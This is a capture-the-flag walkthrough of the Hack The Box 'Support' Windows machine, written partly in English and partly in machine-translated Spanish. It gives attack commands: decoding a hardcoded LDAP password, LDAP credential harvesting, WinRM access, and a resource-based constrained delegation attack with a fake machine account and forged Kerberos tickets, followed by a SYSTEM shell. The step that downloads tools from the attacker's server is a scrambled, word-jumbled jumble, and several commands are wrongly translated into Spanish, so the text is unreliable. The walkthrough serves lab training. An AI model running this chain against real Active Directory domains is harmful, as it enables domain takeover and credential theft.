![Support Banner](support.png)

# 🚀 HTB Support – Machine Walkthrough

**Machine:** Support (Windows)  
**Difficulty:** Easy  
**Techniques:** SMB Enumeration, Hardcoded Credentials, LDAP Query, WinRM, RBCD Attack, Kerberos Delegation  

---

## 📁 Reconnaissance

### SMB Share Enumeration
```bash
smbclient -N -L //10.129.230.181

Ingeniería inversa – Credenciales LDAP

El binario UserInfo.exeContenía una contraseña codificada en base64 y una clave XOR.

Script de descifrado:
pitón

import  base64 
 enc  =   "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E" 
 key  =   b"armando" 
 dec  =  base64  .  b64decode  (  enc  ) 
 passwd  =   bytearray  (  ) 
 for  i  in   range  (  len  (  dec  )  )  : 
 passwd  .  append  (  dec  [  i  ]   ^  key  [  i  %   len  (  key  )  ]   ^   0xDF  ) 
 print  (  passwd  .  decode  (  )  ) 

Contraseña LDAP: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
User: ldap (or support\ldap)
🔎 Enumeración LDAP

Consulta el dominio para encontrar el supportContraseña del usuario:
intento

ldapsearch  -x   -H  ldap://10.129.230.181  \ 
   -D   'support\ldap'   -w   'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'   \ 
   -b   'DC=support,DC=htb'   |   grep   -i   'info:' 

Resultado:
info: Ironside47pleasure40Watchful

Ahora tenemos credenciales válidas para el usuario. support.
💻 Acceso inicial – WinRM
intento

evil-winrm  -i   10.129  .230.181  -u  support  -p   'Ironside47pleasure40Watchful' 

Bandera de usuario obtenida:
texto

C:\Users\support\Desktop\user.txt → 633e1015f09d7dd836f7f111d2c399d5 

⚡ Escalada de privilegios: ataque RBCD

Bloodhound revela que support tiene GenericAllderechos sobre el objeto Controlador de dominio DC.SUPPORT.HTB.
Esto permite un ataque de delegación restringida basada en recursos (RBCD, por sus siglas en inglés) .
1. Cargar las herramientas necesarias (PowerView, Powermad, Rubeus)

Dentro del evil-winrm sesión:
PowerShell

 10.10.17.101:8000 
 WebRequest   -  Uri  PowerView.ps1  OutFile  http://10.10.17.101:8000/PowerView.ps1  (  atacante  HTTP  servidor  -  http://10.10.17.101:8000/powermad.ps1  -  Descarga  -  powermad.ps1  OutFile  del 
 WebRequest   -  Uri  desde #  Uri  -  http://10.10.17.101:8000/Rubeus.exe  -  el  )  -  Invoke  WebRequest  Invoke  OutFile  Rubeus.exe  - 
 Invoke  ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ 

2. Crea una cuenta de máquina falsa
PowerShell

Import-Module .\PowerView.ps1
Import-Module .\powermad.ps1
$pass = ConvertTo-SecureString '123456' -AsPlainText -Force
New-MachineAccount -MachineAccount FAKE01 -Password $pass -Verbose

3. Obtén el SID de la máquina falsa.
PowerShell

$sid  =  (  Get-DomainComputer  FAKE01  )  .  ObjectSID 
 echo   $sid     # p. ej., S-1-5-21-...-6103 

4. Modificar los DC msDS-AllowedToActOnBehalfOfOtherIdentity
PowerShell

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes} -Verbose

5. Solicite un ticket Kerberos como Administrator(en tu máquina atacante)
intento

impacket-getST  -spn  cifs/dc.support.htb  -impersonate  administrator support.htb/FAKE01  \  $:123456 -dc-ip  10.129  .230.181 

Esto genera administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache.
6. Carga el ticket y obtén una shell del sistema.
intento

export   KRB5CCNAME  =  $(  pwd  )  /administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
 impacket-wmiexec  -k  -no-pass support.htb/administrator@dc.support.htb -dc-ip  10.129  .230.181 

Dentro de la cáscara:
comando

Escriba C:\Users\Administrator\Desktop\root.txt 

Bandera raíz: c78f6e6b7f4c8b2e3a9d1c5e7f8a2b4d
🧹 Limpieza (opcional)

Eliminar la cuenta de máquina falsa:
PowerShell

Obtener-Computador-Dominio  FAKE01  |   Eliminar-Objeto-Dominio   -  Verbose 

📌 Resumen de banderas
Bandera 	Valor
Usuario 	633e1015f09d7dd836f7f111d2c399d5
Raíz 	c78f6e6b7f4c8b2e3a9d1c5e7f8a2b4d
🛠 Herramientas utilizadas

    smbclient, ldapsearch

    evil-winrm

    PowerView, Powermad, Rubeus

    Impacket: getST.py, wmiexec.py

    Python (script de decodificación) 

📚 Referencias

    Delegación restringida basada en recursos – iRed.team 

¡Feliz hackeo! 🎯
---
---
**cosmenoide** · Desarrollo y Seguridad  
*Pentesting | Active Directory | Red Team*

